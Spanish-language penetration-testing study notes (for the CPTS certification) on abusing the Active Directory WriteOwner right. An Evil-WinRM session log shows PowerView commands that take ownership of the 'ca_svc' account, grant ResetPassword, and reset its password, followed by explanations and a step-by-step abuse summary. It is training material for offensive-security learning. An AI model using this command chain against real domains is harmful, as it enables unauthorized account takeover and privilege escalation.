
``` bash
*Evil-WinRM* PS C:\tmp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\tmp> Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
*Evil-WinRM* PS C:\tmp> Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -Prin
*Evil-WinRM* PS C:\tmp>  $cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force
*Evil-WinRM* PS C:\tmp> Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
```

# Abuso de WriteOwner — Notas CPTS

## Comandos utilizados

`Import-Module .\PowerView.ps1`  
Carga el módulo PowerView en la sesión de PowerShell desde el archivo local `PowerView.ps1`.  
Permite usar funciones de enumeración y manipulación de Active Directory (owners, ACLs, usuarios, etc.).

`Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"`  
Cambia el **propietario** (owner) del objeto de dominio `ca_svc` para que el nuevo owner sea la identidad `ryan`.  
(Abuso de **WriteOwner**: permite al nuevo owner luego modificar ACLs.)

`Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -Principal "ryan"`  
Añade una entrada en la ACL del objeto `ca_svc` otorgando a `ryan` el derecho `ResetPassword`.  
Con ese permiso, `ryan` puede resetear la contraseña de `ca_svc` sin conocer la contraseña anterior.

`$cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force`  
Convierte la cadena `"Password123!!"` en un `SecureString` en memoria, formato requerido por cmdlets que esperan contraseñas seguras.

`Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred`  
Resetea la contraseña del usuario/servicio `ca_svc` a la que contiene `$cred`.  
Como se otorgó `ResetPassword` previamente, esto permite tomar control de la cuenta sin conocer la contraseña original.

---

## ¿Qué es WriteOwner? (versión corta — para tus notas CPTS)

**WriteOwner** (también **WRITE_OWNER** en descriptores de seguridad Windows) es un derecho de acceso que permite **cambiar el propietario** de un objeto (archivo, cuenta de AD, OU, etc.).  
Tener **WriteOwner** sobre un objeto te da una vía poderosa de control: el nuevo propietario puede **modificar las ACLs del objeto** y luego **concederse permisos adicionales** que le permitan actuar sobre él (por ejemplo, `ResetPassword`, `WriteDacl`, etc.).

### Por qué importa
Cambiar el owner es un vector de escalada/persistencia: un atacante puede comprarse owner → añadir ACEs → resetear contraseñas o tomar control del servicio/usuario.

### Cómo se abusa (resumen)
1. Obtener **WriteOwner** sobre una cuenta/objeto.  
2. Cambiar el owner a una identidad bajo control del atacante.  
3. Con el nuevo owner, modificar ACLs para otorgarse derechos (ej. `ResetPassword`).  
4. Resetear la contraseña y usar la cuenta.

**Ejemplo práctico:**  
`Set-DomainObjectOwner` + `Add-DomainObjectAcl` + `Set-DomainUserPassword` — patrón clásico.
